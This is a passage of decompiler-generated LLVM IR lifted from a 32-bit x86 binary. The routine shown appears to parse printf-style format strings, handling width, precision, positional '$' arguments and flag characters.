  %v5_804ea7a = add i32 %v4_804ea7a, %v3_804ea7a
  %v6_804ea7a = inttoptr i32 %v5_804ea7a to i8*
  store i8 %v1_804ea7a, i8* %v6_804ea7a, align 1
  %v0_804ea7e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea7e = urem i32 %v0_804ea7e, 256
  %v2_804ea7e = load i32, i32* @ebx, align 4
  %v3_804ea7e = and i32 %v2_804ea7e, -256
  %v4_804ea7e = or i32 %v3_804ea7e, %v1_804ea7e
  store i32 %v4_804ea7e, i32* @ebx, align 4
  %v1_804ea80 = mul i32 %v0_804ea7e, 16777216
  %v2_804ea80 = sdiv i32 %v1_804ea80, 16777216
  store i32 %v2_804ea80, i32* %eax.global-to-local, align 4
  %v1_804ea83 = load i32, i32* @edx, align 4
  %v2_804ea83 = load i32, i32* @ecx, align 4
  %v3_804ea83 = add i32 %v1_804ea83, -4
  %v4_804ea83 = add i32 %v3_804ea83, %v2_804ea83
  %v5_804ea83 = inttoptr i32 %v4_804ea83 to i32*
  %v6_804ea83 = load i32, i32* %v5_804ea83, align 4
  %v17_804ea83 = icmp eq i32 %v2_804ea80, %v6_804ea83
  %v1_804ea87 = icmp eq i1 %v17_804ea83, false
  br i1 %v1_804ea87, label %dec_label_pc_804edd0, label %dec_label_pc_804ea8d

dec_label_pc_804ea8d:                             ; preds = %dec_label_pc_804ea69
  %v3_804ea8d = trunc i32 %v0_804ea7e to i8
  %v4_804ea8d = icmp eq i8 %v3_804ea8d, 0
  br i1 %v4_804ea8d, label %dec_label_pc_804ea97, label %dec_label_pc_804ea91

dec_label_pc_804ea91:                             ; preds = %dec_label_pc_804ea8d
  %v0_804ea91 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ea91 = add i32 %v0_804ea91, 1
  store i32 %v1_804ea91, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804ea91, 32
  br i1 %tmp175, label %dec_label_pc_804ea91.dec_label_pc_804ea69_crit_edge, label %dec_label_pc_804ea97

dec_label_pc_804ea91.dec_label_pc_804ea69_crit_edge: ; preds = %dec_label_pc_804ea91
  %v2_804ea7a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea69

dec_label_pc_804ea97:                             ; preds = %dec_label_pc_804ea91, %dec_label_pc_804ea8d
  %v2_804ea9c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804eab4.outer

dec_label_pc_804eab4.outer:                       ; preds = %dec_label_pc_804ea97, %dec_label_pc_804ea56, %dec_label_pc_804ebd1
  %v0_804eac0.ph94 = phi i32 [ %v1_804ebd1, %dec_label_pc_804ebd1 ], [ %v2_804ea56, %dec_label_pc_804ea56 ], [ %v2_804ea9c, %dec_label_pc_804ea97 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ebd1 ], [ %tmp66, %dec_label_pc_804ea56 ], [ %tmp66, %dec_label_pc_804ea97 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ea5a, %dec_label_pc_804ebd1 ], [ 0, %dec_label_pc_804ea56 ], [ 0, %dec_label_pc_804ea97 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ebd1 ], [ %v3_804ea44, %dec_label_pc_804ea56 ], [ %v3_804ea44, %dec_label_pc_804ea97 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ebd1 ], [ 0, %dec_label_pc_804ea56 ], [ 0, %dec_label_pc_804ea97 ]
  %v7_804eabb = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804eabb = trunc i64 %v7_804eabb to i32
  %v2_804eac3 = add i32 %v8_804eabb, 80
  br label %dec_label_pc_804eab4

dec_label_pc_804eab4:                             ; preds = %dec_label_pc_804eab4.outer, %dec_label_pc_804eb71
  %v0_804eac0 = phi i32 [ %v0_804eb7e, %dec_label_pc_804eb71 ], [ %v0_804eac0.ph94, %dec_label_pc_804eab4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804eb71 ], [ %stack_var_-32.1.ph, %dec_label_pc_804eab4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804eb71 ], [ %stack_var_-88.1.ph, %dec_label_pc_804eab4.outer ]
  store i32 %v0_804eac0, i32* @edx, align 4
  store i32 %v0_804eac0, i32* @esi, align 4
  %v1_804eab6 = inttoptr i32 %v0_804eac0 to i8*
  %v2_804eab6 = load i8, i8* %v1_804eab6, align 1
  %v11_804eab6 = icmp eq i8 %v2_804eab6, 42
  %v1_804eab9 = icmp eq i1 %v11_804eab6, false
  br i1 %v1_804eab9, label %dec_label_pc_804eacb, label %dec_label_pc_804eabb

dec_label_pc_804eabb:                             ; preds = %dec_label_pc_804eab4
  store i32 %v8_804eabb, i32* %eax.global-to-local, align 4
  %v1_804eac0 = add i32 %v0_804eac0, 1
  store i32 %v1_804eac0, i32* @esi, align 4
  %v0_804eac3 = load i32, i32* @esp, align 4
  %v3_804eac3 = add i32 %v2_804eac3, %v0_804eac3
  %v4_804eac3 = inttoptr i32 %v3_804eac3 to i32*
  store i32 0, i32* %v4_804eac3, align 4
  %v0_804eae5.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eacb

dec_label_pc_804eacb:                             ; preds = %dec_label_pc_804eab4, %dec_label_pc_804eabb
  %v0_804eae5.pre = phi i32 [ %v0_804eac0, %dec_label_pc_804eab4 ], [ %v0_804eae5.pre.pre, %dec_label_pc_804eabb ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804eacd = load i32, i32* @global_var_8059858, align 8
  store i32 %v0_804eacd, i32* %ebp.global-to-local, align 4
  %v4_804eae5.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804eae5124 = inttoptr i32 %v0_804eae5.pre to i8*
  %v2_804eae5125 = load i8, i8* %v1_804eae5124, align 1
  %v3_804eae5126 = zext i8 %v2_804eae5125 to i32
  %v5_804eae5127 = and i32 %v4_804eae5.pre, -256
  %v6_804eae5128 = or i32 %v3_804eae5126, %v5_804eae5127
  store i32 %v6_804eae5128, i32* %eax.global-to-local, align 4
  %v2_804eae7129 = sext i8 %v2_804eae5125 to i32
  store i32 %v2_804eae7129, i32* @ecx, align 4
  %v2_804eaea130 = mul nsw i32 %v2_804eae7129, 2
  %v3_804eaea131 = add i32 %v2_804eaea130, %v0_804eacd
  %v4_804eaea132 = inttoptr i32 %v3_804eaea131 to i8*
  %v5_804eaea133 = load i8, i8* %v4_804eaea132, align 1
  %v6_804eaea134 = and i8 %v5_804eaea133, 8
  %v7_804eaea135 = icmp eq i8 %v6_804eaea134, 0
  %v1_804eaef136 = icmp eq i1 %v7_804eaea135, false
  br i1 %v1_804eaef136, label %dec_label_pc_804ead5, label %dec_label_pc_804eaf1

dec_label_pc_804ead5:                             ; preds = %dec_label_pc_804eacb, %dec_label_pc_804eae4
  %v2_804eae7140 = phi i32 [ %v2_804eae7, %dec_label_pc_804eae4 ], [ %v2_804eae7129, %dec_label_pc_804eacb ]
  %v6_804eae5139 = phi i32 [ %v6_804eae5, %dec_label_pc_804eae4 ], [ %v6_804eae5128, %dec_label_pc_804eacb ]
  %v0_804eae4138 = phi i32 [ %v1_804eae4, %dec_label_pc_804eae4 ], [ %v0_804eae5.pre, %dec_label_pc_804eacb ]
  %v1_804eadd137 = phi i32 [ %v0_804eaff32, %dec_label_pc_804eae4 ], [ 0, %dec_label_pc_804eacb ]
  %v1_804ead5 = add i32 %v1_804eadd137, -4094
  %v6_804ead5 = sub i32 4093, %v1_804eadd137
  %v7_804ead5 = and i32 %v6_804ead5, %v1_804eadd137
  %v8_804ead5 = icmp slt i32 %v7_804ead5, 0
  %v9_804ead5 = icmp eq i32 %v1_804ead5, 0
  %v10_804ead5 = icmp slt i32 %v1_804ead5, 0
  %v3_804eadb = icmp eq i1 %v10_804ead5, %v8_804ead5
  %v4_804eadb = icmp eq i1 %v9_804ead5, false
  %v5_804eadb = and i1 %v4_804eadb, %v3_804eadb
  br i1 %v5_804eadb, label %dec_label_pc_804eae4, label %dec_label_pc_804eadd

dec_label_pc_804eadd:                             ; preds = %dec_label_pc_804ead5
  %v3_804eadd = mul i32 %v1_804eadd137, 10
  store i32 %v3_804eadd, i32* %eax.global-to-local, align 4
  %v2_804eae0 = add i32 %v3_804eadd, -48
  %v3_804eae0 = add i32 %v2_804eae0, %v2_804eae7140
  store i32 %v3_804eae0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eae4

dec_label_pc_804eae4:                             ; preds = %dec_label_pc_804ead5, %dec_label_pc_804eadd
  %v0_804eaff32 = phi i32 [ %v1_804eadd137, %dec_label_pc_804ead5 ], [ %v3_804eae0, %dec_label_pc_804eadd ]
  %v4_804eae528 = phi i32 [ %v6_804eae5139, %dec_label_pc_804ead5 ], [ %v3_804eadd, %dec_label_pc_804eadd ]
  %v1_804eae4 = add i32 %v0_804eae4138, 1
  store i32 %v1_804eae4, i32* @esi, align 4
  %v1_804eae5 = inttoptr i32 %v1_804eae4 to i8*
  %v2_804eae5 = load i8, i8* %v1_804eae5, align 1
  %v3_804eae5 = zext i8 %v2_804eae5 to i32
  %v5_804eae5 = and i32 %v4_804eae528, -256
  %v6_804eae5 = or i32 %v3_804eae5, %v5_804eae5
  store i32 %v6_804eae5, i32* %eax.global-to-local, align 4
  %v2_804eae7 = sext i8 %v2_804eae5 to i32
  store i32 %v2_804eae7, i32* @ecx, align 4
  %v2_804eaea = mul nsw i32 %v2_804eae7, 2
  %v3_804eaea = add i32 %v2_804eaea, %v0_804eacd
  %v4_804eaea = inttoptr i32 %v3_804eaea to i8*
  %v5_804eaea = load i8, i8* %v4_804eaea, align 1
  %v6_804eaea = and i8 %v5_804eaea, 8
  %v7_804eaea = icmp eq i8 %v6_804eaea, 0
  %v1_804eaef = icmp eq i1 %v7_804eaea, false
  br i1 %v1_804eaef, label %dec_label_pc_804ead5, label %dec_label_pc_804eaf1

dec_label_pc_804eaf1:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eacb
  %v1_804eadd.lcssa = phi i32 [ 0, %dec_label_pc_804eacb ], [ %v0_804eaff32, %dec_label_pc_804eae4 ]
  %v0_804eae4.lcssa = phi i32 [ %v0_804eae5.pre, %dec_label_pc_804eacb ], [ %v1_804eae4, %dec_label_pc_804eae4 ]
  %v2_804eae5.lcssa = phi i8 [ %v2_804eae5125, %dec_label_pc_804eacb ], [ %v2_804eae5, %dec_label_pc_804eae4 ]
  %v6_804eae5.lcssa = phi i32 [ %v6_804eae5128, %dec_label_pc_804eacb ], [ %v6_804eae5, %dec_label_pc_804eae4 ]
  %v0_804eaf1 = load i32, i32* @edx, align 4
  %v1_804eaf1 = add i32 %v0_804eaf1, -1
  %v2_804eaf1 = inttoptr i32 %v1_804eaf1 to i8*
  %v3_804eaf1 = load i8, i8* %v2_804eaf1, align 1
  %v12_804eaf1 = icmp eq i8 %v3_804eaf1, 37
  %v1_804eaf5 = icmp eq i1 %v12_804eaf1, false
  br i1 %v1_804eaf5, label %dec_label_pc_804eb88, label %dec_label_pc_804eafb

dec_label_pc_804eafb:                             ; preds = %dec_label_pc_804eaf1
  %v10_804eafb = icmp eq i8 %v2_804eae5.lcssa, 36
  %v1_804eafd = icmp eq i1 %v10_804eafb, false
  br i1 %v1_804eafd, label %dec_label_pc_804eb2f, label %dec_label_pc_804eaff

dec_label_pc_804eaff:                             ; preds = %dec_label_pc_804eafb
  %tmp89 = icmp slt i32 %v1_804eadd.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804eb2f, label %dec_label_pc_804eb03

dec_label_pc_804eb03:                             ; preds = %dec_label_pc_804eaff
  %v1_804eb03 = add i32 %v0_804eae4.lcssa, 1
  store i32 %v1_804eb03, i32* @edx, align 4
  %v4_804eb06 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804eb06, label %dec_label_pc_804edd0, label %dec_label_pc_804eb11

dec_label_pc_804eb11:                             ; preds = %dec_label_pc_804eb03
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804eb19 = sub i32 %v1_804eadd.lcssa, %stack_var_-88.1
  %v8_804eb19 = xor i32 %v1_804eadd.lcssa, %stack_var_-88.1
  %v9_804eb19 = xor i32 %v2_804eb19, %v1_804eadd.lcssa
  %v10_804eb19 = and i32 %v9_804eb19, %v8_804eb19
  %v11_804eb19 = icmp slt i32 %v10_804eb19, 0
  %v12_804eb19 = icmp eq i32 %v2_804eb19, 0
  %v13_804eb19 = icmp slt i32 %v2_804eb19, 0
  %v3_804eb1b = icmp ne i1 %v13_804eb19, %v11_804eb19
  %v4_804eb1b = or i1 %v12_804eb19, %v3_804eb1b
  %stack_var_-88.1.v0_804eb1d = select i1 %v4_804eb1b, i32 %stack_var_-88.1, i32 %v1_804eadd.lcssa
  br label %dec_label_pc_804eb2b

dec_label_pc_804eb2b:                             ; preds = %dec_label_pc_804eb3f, %dec_label_pc_804eb11, %dec_label_pc_804eb43
  %v0_804eb2b = phi i32 [ %v1_804eb03, %dec_label_pc_804eb11 ], [ %v0_804eaf1, %dec_label_pc_804eb43 ], [ %v0_804eaf1, %dec_label_pc_804eb3f ]
  %stack_var_-32.2 = phi i32 [ %v1_804eadd.lcssa, %dec_label_pc_804eb11 ], [ %stack_var_-32.1, %dec_label_pc_804eb43 ], [ %stack_var_-32.1, %dec_label_pc_804eb3f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804eb1d, %dec_label_pc_804eb11 ], [ 0, %dec_label_pc_804eb43 ], [ 0, %dec_label_pc_804eb3f ]
  store i32 %v0_804eb2b, i32* @esi, align 4
  br label %dec_label_pc_804eb52

dec_label_pc_804eb2f:                             ; preds = %dec_label_pc_804eaff, %dec_label_pc_804eafb
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804eb3f, label %dec_label_pc_804eb36

dec_label_pc_804eb36:                             ; preds = %dec_label_pc_804eb2f
  %v10_804eb36 = icmp eq i8 %v2_804eae5.lcssa, 109
  br i1 %v10_804eb36, label %dec_label_pc_804eb88, label %dec_label_pc_804edd0

dec_label_pc_804eb3f:                             ; preds = %dec_label_pc_804eb2f
  %tmp176 = icmp ugt i32 %v0_804eae4.lcssa, %v0_804eaf1
  br i1 %tmp176, label %dec_label_pc_804eb43, label %dec_label_pc_804eb2b

dec_label_pc_804eb43:                             ; preds = %dec_label_pc_804eb3f
  %v1_804eb43 = inttoptr i32 %v0_804eaf1 to i8*
  %v2_804eb43 = load i8, i8* %v1_804eb43, align 1
  %v8_804eb43 = icmp eq i8 %v2_804eb43, 48
  br i1 %v8_804eb43, label %dec_label_pc_804eb2b, label %dec_label_pc_804eb88

dec_label_pc_804eb52:                             ; preds = %dec_label_pc_804eb63, %dec_label_pc_804eb2b
  %v0_804eb7e = phi i32 [ %v1_804eb63, %dec_label_pc_804eb63 ], [ %v0_804eb2b, %dec_label_pc_804eb2b ]
  %v4_804eb5c35 = phi i32 [ %v6_804eb5c, %dec_label_pc_804eb63 ], [ %v6_804eae5.lcssa, %dec_label_pc_804eb2b ]
  store i32 ptrtoint ([8 x i8]* @global_var_8056e6a.207 to i32), i32* %edx.global-to-local, align 4
  %v1_804eb5f = inttoptr i32 %v0_804eb7e to i8*
  br label %dec_label_pc_804eb5c

dec_label_pc_804eb5c:                             ; preds = %dec_label_pc_804eb6d, %dec_label_pc_804eb52
  %v4_804eb5c = phi i32 [ %v4_804eb5c35, %dec_label_pc_804eb52 ], [ %v6_804eb5c, %dec_label_pc_804eb6d ]
  %v0_804eb5e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8056e6a.207 to i32), %dec_label_pc_804eb52 ], [ %v1_804eb5e, %dec_label_pc_804eb6d ]
  %v0_804eb6d = phi i32 [ 1, %dec_label_pc_804eb52 ], [ %v2_804eb6d, %dec_label_pc_804eb6d ]
  store i32 %v0_804eb6d, i32* @ecx, align 4
  %v1_804eb5c = inttoptr i32 %v0_804eb5e to i8*
  %v2_804eb5c = load i8, i8* %v1_804eb5c, align 1
  %v3_804eb5c = zext i8 %v2_804eb5c to i32
  %v5_804eb5c = and i32 %v4_804eb5c, -256
  %v6_804eb5c = or i32 %v3_804eb5c, %v5_804eb5c
  store i32 %v6_804eb5c, i32* %eax.global-to-local, align 4
  %v1_804eb5e = add i32 %v0_804eb5e, 1
  store i32 %v1_804eb5e, i32* @edx, align 4
  %v2_804eb5f = load i8, i8* %v1_804eb5f, align 1
  %v15_804eb5f = icmp eq i8 %v2_804eb5f, %v2_804eb5c
  %v1_804eb61 = icmp eq i1 %v15_804eb5f, false
  br i1 %v1_804eb61, label %dec_label_pc_804eb68, label %dec_label_pc_804eb63

dec_label_pc_804eb63:                             ; preds = %dec_label_pc_804eb5c
  %v1_804eb63 = add i32 %v0_804eb7e, 1
  store i32 %v1_804eb63, i32* @esi, align 4
  %v0_804eb64 = load i32, i32* %edi.global-to-local, align 4
  %v2_804eb64 = or i32 %v0_804eb64, %v0_804eb6d
  store i32 %v2_804eb64, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804eb52

dec_label_pc_804eb68:                             ; preds = %dec_label_pc_804eb5c
  %v1_804eb68 = inttoptr i32 %v1_804eb5e to i8*
  %v2_804eb68 = load i8, i8* %v1_804eb68, align 1
  %v3_804eb68 = icmp eq i8 %v2_804eb68, 0
  br i1 %v3_804eb68, label %dec_label_pc_804eb71, label %dec_label_pc_804eb6d

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb68
  %v2_804eb6d = mul i32 %v0_804eb6d, 2
  br label %dec_label_pc_804eb5c

dec_label_pc_804eb71:                             ; preds = %dec_label_pc_804eb68
  %v0_804eb71 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804eb75 = udiv i32 %v0_804eb71, 2
  %v1_804eb75.not = or i32 %v1_804eb75, -6
  %v1_804eb7a = xor i32 %v1_804eb75.not, 5
  store i32 %v1_804eb7a, i32* %eax.global-to-local, align 4
  %v2_804eb7c = and i32 %v1_804eb7a, %v0_804eb71
  store i32 %v2_804eb7c, i32* %edi.global-to-local, align 4
  %v1_804eb7e = add i32 %v0_804eb7e, -1
  %v2_804eb7e = inttoptr i32 %v1_804eb7e to i8*
  %v3_804eb7e = load i8, i8* %v2_804eb7e, align 1
  %v12_804eb7e = icmp eq i8 %v3_804eb7e, 37
  %v1_804eb82 = icmp eq i1 %v12_804eb7e, false
  br i1 %v1_804eb82, label %dec_label_pc_804eab4, label %dec_label_pc_804eb88

dec_label_pc_804eb88:                             ; preds = %dec_label_pc_804eb43, %dec_label_pc_804eb71, %dec_label_pc_804eaf1, %dec_label_pc_804eb36
  %v0_804ebab = phi i32 [ %v1_804eadd.lcssa, %dec_label_pc_804eb36 ], [ %v1_804eadd.lcssa, %dec_label_pc_804eb43 ], [ 0, %dec_label_pc_804eb71 ], [ %v1_804eadd.lcssa, %dec_label_pc_804eaf1 ]
  %v1_804ebb4 = phi i32 [ %v0_804eae4.lcssa, %dec_label_pc_804eb36 ], [ %v0_804eae4.lcssa, %dec_label_pc_804eb43 ], [ %v0_804eb7e, %dec_label_pc_804eb71 ], [ %v0_804eae4.lcssa, %dec_label_pc_804eaf1 ]
  %v0_804ebb1 = phi i32 [ %v0_804eaf1, %dec_label_pc_804eb36 ], [ %v0_804eaf1, %dec_label_pc_804eb43 ], [ %v1_804eb5e, %dec_label_pc_804eb71 ], [ %v0_804eaf1, %dec_label_pc_804eaf1 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804eb36 ], [ %stack_var_-32.1, %dec_label_pc_804eb43 ], [ %stack_var_-32.2, %dec_label_pc_804eb71 ], [ %stack_var_-32.1, %dec_label_pc_804eaf1 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804eb36 ], [ 0, %dec_label_pc_804eb43 ], [ %stack_var_-88.2, %dec_label_pc_804eb71 ], [ %stack_var_-88.1, %dec_label_pc_804eaf1 ]
  %v1_804eb88 = inttoptr i32 %v0_804ebb1 to i8*
  %v2_804eb88 = load i8, i8* %v1_804eb88, align 1
  %v11_804eb88 = icmp eq i8 %v2_804eb88, 42
  %v1_804eb8b = icmp eq i1 %v11_804eb88, false
  br i1 %v1_804eb8b, label %dec_label_pc_804ebc1, label %dec_label_pc_804eb8d

dec_label_pc_804eb8d:                             ; preds = %dec_label_pc_804eb88
  %v4_804eb8d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804eb8d, label %dec_label_pc_804ebb1, label %dec_label_pc_804eb94

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb8d
  %v1_804eb94 = inttoptr i32 %v1_804ebb4 to i8*
  %v2_804eb94 = load i8, i8* %v1_804eb94, align 1
  %v11_804eb94 = icmp eq i8 %v2_804eb94, 36
  %v1_804eb97 = icmp eq i1 %v11_804eb94, false
  br i1 %v1_804eb97, label %dec_label_pc_804edd0, label %dec_label_pc_804eb9d

dec_label_pc_804eb9d:                             ; preds = %dec_label_pc_804eb94
  %tmp91 = icmp slt i32 %v0_804ebab, 1
  br i1 %tmp91, label %dec_label_pc_804edd0, label %dec_label_pc_804eba5

dec_label_pc_804eba5:                             ; preds = %dec_label_pc_804eb9d
  store i32 %v8_804eabb, i32* %eax.global-to-local, align 4
  %v1_804ebaa = add i32 %v1_804ebb4, 1
  store i32 %v1_804ebaa, i32* @esi, align 4
  %v1_804ebab = load i32, i32* @esp, align 4
  %v3_804ebab = add i32 %v8_804eabb, 68
  %v4_804ebab = add i32 %v3_804ebab, %v1_804ebab
  %v5_804ebab = inttoptr i32 %v4_804ebab to i32*
  store i32 %v0_804ebab, i32* %v5_804ebab, align 4
  %v0_804ebef.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ebbc

dec_label_pc_804ebb1:                             ; preds = %dec_label_pc_804eb8d
  %v1_804ebb1 = add i32 %v0_804ebb1, 1
  store i32 %v1_804ebb1, i32* %eax.global-to-local, align 4
  %v12_804ebb4 = icmp eq i32 %v1_804ebb1, %v1_804ebb4
  %v1_804ebb6 = icmp eq i1 %v12_804ebb4, false
  br i1 %v1_804ebb6, label %dec_label_pc_804edd0, label %dec_label_pc_804ebbc

dec_label_pc_804ebbc:                             ; preds = %dec_label_pc_804ebb1, %dec_label_pc_804eba5
  %v0_804ebef.pre.pre.pre = phi i32 [ %v1_804ebb4, %dec_label_pc_804ebb1 ], [ %v0_804ebef.pre.pre.pre.pre, %dec_label_pc_804eba5 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ebc1

dec_label_pc_804ebc1:                             ; preds = %dec_label_pc_804eb88, %dec_label_pc_804ebbc
  %v0_804ebef.pre.pre = phi i32 [ %v1_804ebb4, %dec_label_pc_804eb88 ], [ %v0_804ebef.pre.pre.pre, %dec_label_pc_804ebbc ]
  %v0_804ea5a = phi i32 [ %v0_804ebab, %dec_label_pc_804eb88 ], [ -2147483648, %dec_label_pc_804ebbc ]
  %v4_804ebc1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ebc1 = icmp eq i32 %v4_804ebc1, 0
  %v1_804ebc6 = icmp eq i1 %v5_804ebc1, false
  %.pre = inttoptr i32 %v0_804ebef.pre.pre to i8*
  br i1 %v1_804ebc6, label %dec_label_pc_804ebea, label %dec_label_pc_804ebcc

dec_label_pc_804ebcc:                             ; preds = %dec_label_pc_804ebc1
  %v2_804ebcc = load i8, i8* %.pre, align 1
  %v11_804ebcc = icmp eq i8 %v2_804ebcc, 46
  %v1_804ebcf = icmp eq i1 %v11_804ebcc, false
  br i1 %v1_804ebcf, label %dec_label_pc_804ebe3, label %dec_label_pc_804ebd1

dec_label_pc_804ebd1:                             ; preds = %dec_label_pc_804ebcc
  %v1_804ebd1 = add i32 %v0_804ebef.pre.pre, 1
  store i32 %v1_804ebd1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eab4.outer

dec_label_pc_804ebe3:                             ; preds = %dec_label_pc_804ebcc
  br label %dec_label_pc_804ebea

dec_label_pc_804ebea:                             ; preds = %dec_label_pc_804ebc1, %dec_label_pc_804ebe3
  %stack_var_-96.2 = phi i32 [ %v0_804ea5a, %dec_label_pc_804ebe3 ], [ %stack_var_-96.1.ph, %dec_label_pc_804ebc1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804ebe3 ], [ %v0_804ea5a, %dec_label_pc_804ebc1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8056e18.208 to i32), i32* @edx, align 4
  %v4_804ebef.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebef

dec_label_pc_804ebef:                             ; preds = %dec_label_pc_804ebf9, %dec_label_pc_804ebea
  %v0_804ebf9 = phi i32 [ %v1_804ebf9, %dec_label_pc_804ebf9 ], [ ptrtoint ([9 x i8]* @global_var_8056e18.208 to i32), %dec_label_pc_804ebea ]
  %v4_804ebef = phi i32 [ %v6_804ebef, %dec_label_pc_804ebf9 ], [ %v4_804ebef.pre, %dec_label_pc_804ebea ]
  %v2_804ebef = load i8, i8* %.pre, align 1
  %v3_804ebef = zext i8 %v2_804ebef to i32
  %v5_804ebef = and i32 %v4_804ebef, -256
  %v6_804ebef = or i32 %v3_804ebef, %v5_804ebef
  store i32 %v6_804ebef, i32* %eax.global-to-local, align 4
  %v3_804ebf1 = inttoptr i32 %v0_804ebf9 to i8*
  %v4_804ebf1 = load i8, i8* %v3_804ebf1, align 1
  %v15_804ebf1 = icmp eq i8 %v2_804ebef, %v4_804ebf1
  br i1 %v15_804ebf1, label %dec_label_pc_804ea61, label %dec_label_pc_804ebf9

dec_label_pc_804ebf9:                             ; preds = %dec_label_pc_804ebef
  %v1_804ebf9 = add i32 %v0_804ebf9, 1
  store i32 %v1_804ebf9, i32* @edx, align 4
  %v1_804ebfa = inttoptr i32 %v1_804ebf9 to i8*
  %v2_804ebfa = load i8, i8* %v1_804ebfa, align 1
  %v3_804ebfa = icmp eq i8 %v2_804ebfa, 0
  %v1_804ebfd = icmp eq i1 %v3_804ebfa, false
  br i1 %v1_804ebfd, label %dec_label_pc_804ebef, label %dec_label_pc_804ebff

dec_label_pc_804ebff:                             ; preds = %dec_label_pc_804ebf9, %dec_label_pc_804ea61
  %v0_804ec12 = phi i32 [ %v1_804ea61, %dec_label_pc_804ea61 ], [ %v0_804ebef.pre.pre, %dec_label_pc_804ebf9 ]
  %v0_804ec0f = phi i32 [ %v0_804ebf9, %dec_label_pc_804ea61 ], [ %v1_804ebf9, %dec_label_pc_804ebf9 ]
  %v1_804ec01 = add i32 %v0_804ec0f, -134573592
  %v1_804ec06 = add i32 %v0_804ec0f, -134573593
  %v5_804ec06 = sub i32 134573592, %v0_804ec0f
  %v6_804ec06 = and i32 %v1_804ec01, %v5_804ec06
  %v7_804ec06 = icmp slt i32 %v6_804ec06, 0
  %v8_804ec06 = icmp eq i32 %v1_804ec06, 0
  %v9_804ec06 = icmp slt i32 %v1_804ec06, 0
  store i32 %v1_804ec06, i32* %eax.global-to-local, align 4
  %v3_804ec07 = icmp eq i1 %v9_804ec06, %v7_804ec06
  %v4_804ec07 = icmp eq i1 %v8_804ec06, false
  %v5_804ec07 = and i1 %v4_804ec07, %v3_804ec07
  br i1 %v5_804ec07, label %dec_label_pc_804ec13, label %dec_label_pc_804ec09

dec_label_pc_804ec09:                             ; preds = %dec_label_pc_804ebff
  %v1_804ec09 = inttoptr i32 %v0_804ec12 to i8*
  %v2_804ec09 = load i8, i8* %v1_804ec09, align 1
  %v3_804ec09 = zext i8 %v2_804ec09 to i32
  %v5_804ec09 = and i32 %v1_804ec06, -256
  %v6_804ec09 = or i32 %v3_804ec09, %v5_804ec09
  store i32 %v6_804ec09, i32* %eax.global-to-local, align 4
  %v3_804ec0b = inttoptr i32 %v0_804ec0f to i8*
  %v4_804ec0b = load i8, i8* %v3_804ec0b, align 1
  %v15_804ec0b = icmp eq i8 %v2_804ec09, %v4_804ec0b
  %v1_804ec0d = icmp eq i1 %v15_804ec0b, false
  br i1 %v1_804ec0d, label %dec_label_pc_804ec13, label %dec_label_pc_804ec0f

dec_label_pc_804ec0f:                             ; preds = %dec_label_pc_804ec09
  %v1_804ec0f = add i32 %v0_804ec0f, 9
  store i32 %v1_804ec0f, i32* @edx, align 4
  %v1_804ec12 = add i32 %v0_804ec12, 1
  store i32 %v1_804ec12, i32* @esi, align 4
  br label %dec_label_pc_804ec13

dec_label_pc_804ec13:                             ; preds = %dec_label_pc_804ec09, %dec_label_pc_804ebff, %dec_label_pc_804ec0f
  %v4_804ec1a = phi i32 [ %v6_804ec09, %dec_label_pc_804ec09 ], [ %v1_804ec06, %dec_label_pc_804ebff ], [ %v6_804ec09, %dec_label_pc_804ec0f ]
  %v0_804ec1a = phi i32 [ %v0_804ec12, %dec_label_pc_804ec09 ], [ %v0_804ec12, %dec_label_pc_804ebff ], [ %v1_804ec12, %dec_label_pc_804ec0f ]
  %v0_804ec13 = phi i32 [ %v0_804ec0f, %dec_label_pc_804ec09 ], [ %v0_804ec0f, %dec_label_pc_804ebff ], [ %v1_804ec0f, %dec_label_pc_804ec0f ]
  %v1_804ec13 = add i32 %v0_804ec13, 9
  %v2_804ec13 = inttoptr i32 %v1_804ec13 to i8*
  %v3_804ec13 = load i8, i8* %v2_804ec13, align 1
  %v4_804ec13 = sext i8 %v3_804ec13 to i32
  %v2_804ec17 = mul nsw i32 %v4_804ec13, 256
  store i32 %v2_804ec17, i32* %ebx.global-to-local, align 4
